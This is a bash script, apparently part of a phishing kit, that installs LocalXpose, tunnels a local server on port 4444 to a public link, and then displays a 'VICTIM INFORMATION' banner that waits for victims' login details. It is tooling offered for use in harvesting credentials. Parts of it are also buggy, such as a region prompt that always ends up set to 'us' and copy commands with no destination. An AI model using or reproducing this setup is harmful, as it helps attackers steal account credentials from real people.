#!/bin/bash
echo ""

download() {
	url="$1"
	output="$2"
	file=`basename $url`
	if [[ -e "$file" || -e "$output" ]]; then
		rm -rf "$file" "$output"
	fi
	curl --silent --insecure --fail --retry-connrefused \
		--retry 3 --retry-delay 2 --location --output "${file}" "${url}"

	if [[ -e "$file" ]]; then
		if [[ ${file#*.} == "zip" ]]; then
			unzip -qq $file > /dev/null 2>&1
			cp -f $output > /dev/null 2>&1
		elif [[ ${file#*.} == "tgz" ]]; then
			tar -zxf $file > /dev/null 2>&1
			cp -f $output > /dev/null 2>&1
		else
			cp -f $file > /dev/null 2>&1
		fi
		chmod +x $output $file > /dev/null 2>&1
		rm -rf file1
	else
		echo -e "\e[91m Error occured while downloading ${output}."
		{ reset_color; exit 1; }
	fi
}


install_localxpose() {
	if [[ -e "loclx" ]]; then
		echo -e "\e[91m[\e[92m-\e[91m] \e[96m LocalXpose already installed."
	else
		echo -e "\e[91m[\e[92m*\e[91m] \e[96m Installing LocalXpose..."
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
		else
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
		fi
	fi
}

start_loclx() {
echo -e " "
rm -rf .loclx
echo -e ""
	echo -e "\e[91m[\e[0m-\e[91m]\e[1;92m Launching LocalXpose...\e[0m "
	{ sleep 1; localxpose_auth; }
	echo -e "\n"
	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
	[[ ${opinion,,} == "1" ]] && loclx_region="eu" || loclx_region="eu"
	[[ ${opinion,,} == "2" ]] && loclx_region="ap" || loclx_region="ap"
	[[ ${opinion,,} == "2" ]] && loclx_region="us" || loclx_region="us"
	echo -e ""

	if [[ `command -v termux-chroot` ]]; then
		sleep 1 && termux-chroot ./loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t 127.0.0.1:4444 > .loclx 2>&1 &
	else
		sleep 1 && ./loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t 127.0.0.1:4444 > .loclx 2>&1 &
	fi

	sleep 12
	llink=$(cat .loclx | grep -o '[0-9a-zA-Z.]*.loclx.io')
	
}


links_n() {
                           echo -e "\e[96m=======================\e[92m   SUMAN © 2022 FF  \e[96m=======================\e[92m"
                           echo -e " "
			   echo -e " "
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
		           printf "\e[1;33m\e[0m\e[1;33m Ngrok Link :\e[0m\e[1;77m %s\e[0m\n" $llink                                   
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
			   echo ""
			   echo ""
			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================= \e[93m" 
                           echo ""
			   echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m \e[0m\e[1;95m Waiting For Login Info, \e[92mCtrl + C \e[1;95mto Exit...\e[93m "
			   echo ""
}

localxpose_auth() {
	./loclx -help > /dev/null 2>&1 &
	sleep 1
	[ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access" 

	[ "$(./loclx account status | grep Error)" ] && {
	        echo ""
                echo " "
		echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
                echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!      Requirement Localxpose Token    !!\e[0m'
                echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
                echo ""
                echo " "
                echo -e "\e[91m[\e[92m*\e[91m]\e[93m Visit \e[92mlocalxpose.io \e[m "
                echo ""
                echo -e "\e[91m[\e[92m*\e[91m]\e[93m Create an account on & Click Access Button & Copy Access Token \e[m "
                echo ""
		sleep 3
		read -p $'\e[91m[\e[92m*\e[91m]\e[93m Input Loclx Token :\e[97m ' loclx_token
		[[ $loclx_token == "" ]] && {
			echo -e "\e[91m[\e[92m!\e[91m]\e[93m  You have to input Localxpose Token." ; sleep 2 ; tunnel_menu
		} || {
			echo -n "$loclx_token" > $auth_f 2> /dev/null
		}
	}
}




clear
install_localxpose
chmod +x ngrok loclx
start_loclx
links_n
